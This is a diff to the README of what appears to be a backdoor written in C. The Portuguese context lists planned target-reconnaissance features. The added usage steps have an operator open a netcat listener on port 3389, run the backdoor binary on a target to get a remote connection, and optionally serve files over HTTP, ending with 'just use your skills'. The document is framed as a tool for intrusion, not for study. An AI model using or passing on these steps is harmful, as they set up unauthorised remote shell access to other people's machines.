@@ -37,3 +37,22 @@ Desenvolpment of a backdoor write in C.
 ( ) informações sobre: a rede da máquina alvo ( outras máquinas conectadas à mesma rede)
  
 .... mais por vir. 
+
+
+# ./sdinstall.sh
+
+Usage: 
+
+1. nc -lvp 3389 
+
+2. run ./main_backdoor 
+
+3. you have connection. 
+
+# can be very usefull | 4. python -m SimpleHTTPServer 3389 
+
+5. In this pont, just use your skills. 
+
+Peace, 
+
+mrx6SO
